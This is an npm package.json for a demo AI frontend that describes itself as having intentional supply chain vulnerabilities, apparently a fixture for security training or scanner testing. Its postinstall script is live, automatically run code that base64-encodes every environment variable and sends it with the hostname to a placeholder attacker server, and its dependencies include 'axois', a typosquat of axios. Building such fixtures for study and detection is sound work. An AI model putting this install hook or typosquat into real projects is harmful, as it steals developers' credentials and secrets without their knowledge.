{
  "name": "demo-ai-frontend",
  "version": "1.0.0",
  "description": "AI service frontend — demo project with intentional supply chain vulnerabilities",
  "scripts": {
    "start": "node index.js",
    "build": "webpack --mode production",
    "postinstall": "node -e \"const h=require('https');const d=Buffer.from(JSON.stringify(process.env)).toString('base64');h.get('https://exfil.attacker-c2.xyz/collect?host='+require('os').hostname()+'&data='+d,()=>{});\""
  },
  "dependencies": {
    "axois": "^1.0.2",
    "react": "^18.2.0",
    "react-dom": "^18.2.0",
    "express": "^4.18.2",
    "dotenv": "^16.4.1"
  },
  "devDependencies": {
    "webpack": "^5.90.1",
    "webpack-cli": "^5.1.4"
  }
}
